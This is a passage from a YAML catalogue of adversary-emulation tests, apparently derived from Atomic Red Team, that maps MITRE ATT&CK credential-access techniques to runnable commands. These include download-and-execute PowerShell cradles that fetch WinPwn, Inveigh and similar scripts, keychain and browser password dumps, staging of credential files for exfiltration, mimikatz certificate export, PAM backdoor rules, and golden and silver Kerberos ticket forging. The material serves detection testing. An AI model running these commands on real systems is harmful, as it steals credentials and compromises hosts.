'(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\""
      cleanup: |-
        Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
        Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
      timeout: 120
    - name: CertUtil ExportPFX
      type: powershell
      platform: windows
      command: "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\atomic.pfx"
      cleanup: Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item
      timeout: 120
      elevation_required: true
    - name: Export Root Certificate with Export-PFXCertificate
      type: powershell
      platform: windows
      command: |-
        $mypwd = ConvertTo-SecureString -String "AtomicRedTeam" -Force -AsPlainText
        $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
        Set-Location Cert:\LocalMachine\My
        Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $env:Temp\atomicredteam.pfx -Password $mypwd
      cleanup: |-
        try {
        $cert = Import-Certificate -FilePath $env:Temp\atomicredteam.pfx -CertStoreLocation Cert:\LocalMachine\My
        Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
        Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
        } catch { }
      timeout: 120
      elevation_required: true
    - name: Export Root Certificate with Export-Certificate
      type: powershell
      platform: windows
      command: |-
        $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
        Set-Location Cert:\LocalMachine\My
        Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath $env:Temp\AtomicRedTeam.cer
      cleanup: |-
        try {
           $cert = Import-Certificate -FilePath $env:Temp\AtomicRedTeam.cer -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
           Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
           Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
        }
        catch { }
      timeout: 120
      elevation_required: true
    - name: Export Certificates with Mimikatz
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe" "crypto::certificates /systemstore:local_machine /store:my /export"  exit'
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1552/004
  is_safe: false
- id: T1552.006
  name: Group Policy Preferences
  description: |-
    Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)

    These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)

    Th...
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: GPP Passwords (findstr)
      type: cmd
      platform: windows
      command: findstr /S cpassword %logonserver%\sysvol\*.xml
      timeout: 120
    - name: GPP Passwords (Get-GPPPassword)
      type: powershell
      platform: windows
      command: |-
        . "PathToAtomicsFolder\..\ExternalPayloads\Get-GPPPassword.ps1"
        Get-GPPPassword -Verbose
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1552/006
  is_safe: false
- id: T1555
  name: Credentials from Password Stores
  description: 'Adversaries may search for common password storage locations to obtain user credentials.(Citation: F-Secure The Dukes) Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement an...'
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Extract Windows Credential Manager via VBA
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
      cleanup: Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore
      timeout: 120
    - name: Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]
      type: powershell
      platform: windows
      command: IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force
      timeout: 120
    - name: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]
      type: powershell
      platform: windows
      command: IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force
      timeout: 120
    - name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]
      type: powershell
      platform: windows
      command: vaultcmd /listcreds:"Windows Credentials" /all
      timeout: 120
    - name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]
      type: powershell
      platform: windows
      command: vaultcmd /listcreds:"Web Credentials" /all
      timeout: 120
    - name: WinPwn - Loot local Credentials - lazagne
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        lazagnemodule -consoleoutput -noninteractive
      timeout: 120
    - name: WinPwn - Loot local Credentials - Wifi Credentials
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        wificreds -consoleoutput -noninteractive
      timeout: 120
    - name: WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        decryptteamviewer -consoleoutput -noninteractive
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1555
  is_safe: false
- id: T1555.001
  name: Keychain
  description: 'Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operati...'
  tactic: credential-access
  platforms:
    - macos
  executors:
    - name: Keychain Dump
      type: sh
      platform: macos
      command: sudo security dump-keychain -d login.keychain
      timeout: 60
      elevation_required: true
    - name: Export Certificate Item(s)
      type: sh
      platform: macos
      command: security find-certificate -a -p > /tmp/certs.pem
      cleanup: rm /tmp/certs.pem
      timeout: 60
    - name: Import Certificate Item(s) into Keychain
      type: sh
      platform: macos
      command: security import /tmp/certs.pem -k
      timeout: 60
    - name: Copy Keychain using cat utility
      type: sh
      platform: macos
      command: cat ~/Library/Keychains/login.keychain-db > /tmp/keychain
      cleanup: rm /tmp/keychain
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1555/001
  is_safe: false
- id: T1555.003
  name: Credentials from Web Browsers
  description: |-
    Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.

    For example, on Windows systems, encrypted c...
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Run Chrome-password Collector
      type: powershell
      platform: windows
      command: Start-Process "PathToAtomicsFolder\..\ExternalPayloads\Sysinternals\accesschk.exe" -ArgumentList "-accepteula ."
      cleanup: Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\Sysinternals" -Force -Recurse -ErrorAction Ignore
      timeout: 120
    - name: Search macOS Safari Cookies
      type: sh
      platform: macos
      command: |-
        cd ~/Library/Cookies
        grep -q "coinbase" "Cookies.binarycookies"
      timeout: 60
    - name: LaZagne - Credentials from Browser
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\T1555.003\bin\LaZagne.exe" browsers'
      timeout: 120
      elevation_required: true
    - name: Simulating access to Chrome Login Data
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
        Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
      cleanup: |-
        Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
        Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data For Account" -Force -ErrorAction Ignore
      timeout: 120
    - name: Simulating access to Opera Login Data
      type: powershell
      platform: windows
      command: Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
      cleanup: Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
      timeout: 120
    - name: Simulating access to Windows Firefox Login Data
      type: powershell
      platform: windows
      command: Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination "PathToAtomicsFolder\..\ExternalPayloads" -Force -Recurse
      cleanup: Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Profiles" -Force -ErrorAction Ignore -Recurse
      timeout: 120
    - name: Simulating access to Windows Edge Login Data
      type: powershell
      platform: windows
      command: Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination "PathToAtomicsFolder\..\ExternalPayloads\Edge" -Force -Recurse
      cleanup: Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Edge" -Force -ErrorAction Ignore -Recurse
      timeout: 120
    - name: Decrypt Mozilla Passwords with Firepwd.py
      type: powershell
      platform: windows
      command: |-
        $PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
        cmd /c PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\python.exe PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\Firepwd.py -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt
        cat $env:temp\T1555.003Test8.txt
      cleanup: Remove-Item -Path "$env:temp\T1555.003Test8.txt" -erroraction silentlycontinue
      timeout: 120
    - name: LaZagne.py - Dump Credentials from Firefox Browser
      type: sh
      platform: linux
      command: python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt
      cleanup: rm -R /tmp/LaZagne; rm -f /tmp/firefox_password.txt
      timeout: 60
      elevation_required: true
    - name: Stage Popular Credential Files for Exfiltration
      type: powershell
      platform: windows
      command: "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force"
      cleanup: "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue"
      timeout: 120
    - name: WinPwn - BrowserPwn
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        browserpwn -consoleoutput -noninteractive
      cleanup: rm .\System.Data.SQLite.dll -ErrorAction Ignore
      timeout: 120
    - name: WinPwn - Loot local Credentials - mimi-kittenz
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        kittenz -consoleoutput -noninteractive
      timeout: 120
    - name: WinPwn - PowerSharpPack - Sharpweb for Browser Credentials
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
        Invoke-Sharpweb -command "all"
      timeout: 120
    - name: Simulating Access to Chrome Login Data - MacOS
      type: sh
      platform: macos
      command: |-
        cp ~/Library/"Application Support/Google/Chrome/Default/Login Data" "/tmp/T1555.003_Login Data"
        cp ~/Library/"Application Support/Google/Chrome/Default/Login Data For Account" "/tmp/T1555.003_Login Data For Account"
      cleanup: |-
        rm "/tmp/T1555.003_Login Data" >/dev/null 2>&1
        rm "/tmp/T1555.003_Login Data For Account" >/dev/null 2>&1
      timeout: 60
    - name: WebBrowserPassView - Credentials from Browser
      type: powershell
      platform: windows
      command: |-
        Start-Process "PathToAtomicsFolder\T1555.003\bin\WebBrowserPassView.exe"
        Start-Sleep -Second 4
        Stop-Process -Name "WebBrowserPassView"
      timeout: 120
      elevation_required: true
    - name: BrowserStealer (Chrome / Firefox / Microsoft Edge)
      type: powershell
      platform: windows
      command: |-
        $profile = (Gci -filter "*default-release*" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName
        Copy-Item $profile\key4.db -Destination "PathToAtomicsFolder\..\ExternalPayloads" > $null
        Copy-Item $profile\logins.json -Destination "PathToAtomicsFolder\..\ExternalPayloads" > $null
        Remove-Item $profile\key4.db > $null
        Remove-Item $profile\logins.json > $null
        Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\key4.db" -Destination $profile\ > $null
        Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\logins.json" -Destination $profile\ > $null
        cd "$env:PathToAtomicsFolder\T1555.003\bin"
        ""|.\BrowserCollector.exe
      cleanup: |-
        $profile = (Gci -filter "*default-release*" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName
        Remove-Item $profile\key4.db > $null
        Remove-Item $profile\logins.json > $null
        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads" -Destination $profile\ > $null
        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\key4.db" > $null
        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\logins.json" > $null
      timeout: 120
    - name: Dump Chrome Login Data with esentutl
      type: cmd
      platform: windows
      command: esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d "%temp%\T1555.003_Login_Data.tmp"
      cleanup: del /f /q %temp%\T1555.003_Login_Data.tmp > nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1555/003
  is_safe: false
- id: T1555.004
  name: Windows Credential Manager
  description: |-
    Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)

    The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [C...
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Access Saved Credentials via VaultCmd
      type: cmd
      platform: windows
      command: vaultcmd /listcreds:"Windows Credentials"
      timeout: 120
    - name: WinPwn - Loot local Credentials - Invoke-WCMDump
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
        Invoke-WCMDump
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1555/004
  is_safe: false
- id: T1556.002
  name: Password Filter DLL
  description: "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Befo..."
  tactic: credential-access
  tactics:
    - credential-access
    - defense-evasion
    - persistence
  platforms:
    - windows
  executors:
    - name: Install and Register Password Filter DLL
      type: powershell
      platform: windows
      command: |-
        reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
        $passwordFilterName = (Copy-Item "PathToAtomicsFolder\T1556.002\bin\AtomicRedTeamPWFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename
        $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
        $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
        $notificationPackagesValues += $passwordFilterName
        Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
      cleanup: |-
        reg.exe import "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
        remove-item C:\Windows\System32\AtomicRedTeamPWFilter.dll
      timeout: 120
      elevation_required: true
    - name: Install Additional Authentication Packages
      type: powershell
      platform: windows
      command: |-
        reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
        $passwordFilterName = (Copy-Item "PathToAtomicsFolder\T1556.002\bin\AtomicRedTeamPWFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename
        $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
        $AuthenticationPackagesValues = $lsaKey.GetValue("Authentication Packages")
        $AuthenticationPackagesValues += $passwordFilterName
        Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Authentication Packages" $AuthenticationPackagesValues
      cleanup: |-
        reg.exe import "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
        remove-item C:\Windows\System32\AtomicRedTeamPWFilter.dll
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1556/002
  is_safe: false
- id: T1556.003
  name: Pluggable Authentication Modules
  description: 'Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pa...'
  tactic: credential-access
  tactics:
    - credential-access
    - defense-evasion
    - persistence
  platforms:
    - linux
    - macos
  executors:
    - name: Malicious PAM rule
      type: sh
      platform: linux
      command: sudo sed -i "1s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g" /etc/pam.d/su-l
      cleanup: sudo sed -i "\,auth sufficient pam_succeed_if.so uid >= 0,d" /etc/pam.d/su-l
      timeout: 60
      elevation_required: true
    - name: Malicious PAM rule (freebsd)
      type: sh
      platform: linux
      command: sudo sed -i "" "8s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g" /etc/pam.d/su
      cleanup: sudo sed -i "" "/auth sufficient pam_succeed_if.so uid >= 0/d" /etc/pam.d/su
      timeout: 60
      elevation_required: true
    - name: Malicious PAM module
      type: sh
      platform: linux
      command: sudo sed -i "1s,^,auth sufficient /tmp/pam_evil.so\n,g" /etc/pam.d/su-l
      cleanup: sudo sed -i "\,auth sufficient /tmp/pam_evil.so,d" /etc/pam.d/su-l
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1556/003
  is_safe: false
- id: T1557.001
  name: LLMNR/NBT-NS Poisoning and SMB Relay
  description: "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same ..."
  tactic: credential-access
  tactics:
    - credential-access
    - collection
  platforms:
    - windows
  executors:
    - name: LLMNR Poisoning with Inveigh (PowerShell)
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
        Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1557/001
  is_safe: false
- id: T1558.001
  name: Golden Ticket
  description: "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adve..."
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Crafting Active Directory golden tickets with mimikatz
      type: powershell
      platform: windows
      command: "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"S-1-5-21-DEFAULT\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\%userdnsdomain%\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore"
      timeout: 120
    - name: Crafting Active Directory golden tickets with Rubeus
      type: powershell
      platform: windows
      command: "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \"$Env:temp\\rubeus.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \"$Env:temp\\rubeus.exe\" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1558/001
  is_safe: false
- id: T1558.002
  name: Silver Ticket
  description: |-
    Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)

    Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversar...
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Crafting Active Directory silver tickets with mimikatz
      type: powershell
      platform: windows
      command: "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"S-1-5-21-DEFAULT\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to silver.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\silver.txt 2>&1 (\n  echo Purge existing tickets and create silver ticket:\n  klist purge\n  PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% 